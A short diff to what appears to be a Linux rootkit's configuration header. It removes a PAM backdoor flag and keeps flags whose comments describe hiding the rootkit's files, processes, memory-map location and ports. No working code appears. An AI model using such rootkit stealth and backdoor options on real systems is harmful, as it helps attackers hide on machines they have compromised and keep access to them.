@@ -1,5 +1,3 @@
-#define USE_PAM_BD
-
 #define HIDE_SELF // hide all rootkit paths & procs.
 #define FORGE_MAPS // hide rootkit location from process mem map files.
 #define HIDE_PORTS // hide hidden ports specified from a file.
